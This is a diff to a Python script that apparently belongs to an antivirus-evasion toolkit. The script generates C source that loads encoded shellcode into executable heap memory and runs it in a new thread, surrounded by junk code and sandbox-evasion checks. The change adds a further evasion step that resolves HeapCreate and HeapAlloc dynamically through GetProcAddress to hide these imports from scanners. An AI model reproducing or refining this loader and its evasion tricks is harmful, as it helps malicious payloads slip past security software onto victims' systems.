@@ -20,12 +20,8 @@
 
 import random, string
 import sys 
-sys.path.append("Modules/payloads/auxiliar")
-sys.path.append("Modules/payloads/encryption")
-import platform 
+sys.path.append("Modules/payloads/auxiliar") 
 import usefull
-import Multibyte_xor
-import Multibyte_xorPy3
 
 Payload = sys.argv[1]
 
@@ -35,9 +31,13 @@ Encryption = sys.argv[3]
 
 Randbufname = usefull.varname_creator()
 
-Payload = usefull.encoding_manager(Encryption,Payload,Randbufname)
+Payload = usefull.encoding_manager(Encryption,Payload,Randbufname) 
 
 Randgood = usefull.varname_creator()
+
+NdcHeapcreate = usefull.varname_creator()
+
+NdcHeapalloc = usefull.varname_creator()
 
 Randmem = usefull.varname_creator()
 
@@ -58,6 +58,7 @@ Randresult = usefull.varname_creator()
 Randthread = usefull.varname_creator()
 
 Randheapvar = usefull.varname_creator()
+
 
 Junkcode1 = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
 Junkcode2 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
@@ -87,20 +88,22 @@ Hollow_code += "#include <string.h>\n"
 Hollow_code += "#include <math.h>\n"
 Hollow_code += "int main(int argc,char * argv[]){\n"
 Hollow_code += Junkcode1
+Hollow_code += Junkcode2
 Hollow_code += Win_eva1
 Hollow_code += Win_eva2
 Hollow_code += Win_eva3
 Hollow_code += Win_eva4
-Hollow_code += Junkcode2
 Hollow_code += MorphEvasion1
 Hollow_code += MorphEvasion2
 Hollow_code += MorphEvasion3
 Hollow_code += "HANDLE " + Randheapvar + ";LPVOID " + Randlpv + ";HANDLE " + Randhand + ";DWORD " + Randresult + ";DWORD " + Randthread + ";\n"
 Hollow_code += Junkcode3
 Hollow_code += Payload
+Hollow_code += "FARPROC " + NdcHeapcreate + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"HeapCreate\");\n"
+Hollow_code += "FARPROC " + NdcHeapalloc + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"HeapAlloc\");\n"
 Hollow_code += Junkcode4
-Hollow_code += Randheapvar + " = HeapCreate(0x00040000, strlen(" + Randbufname + "), 0);\n"
-Hollow_code += Randlpv + " = HeapAlloc(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
+Hollow_code += Randheapvar + " = (HANDLE)" + NdcHeapcreate + "(0x00040000, strlen(" + Randbufname + "), 0);\n"
+Hollow_code += Randlpv + " = (LPVOID)" + NdcHeapalloc + "(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
 Hollow_code += Junkcode5
 Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
 Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
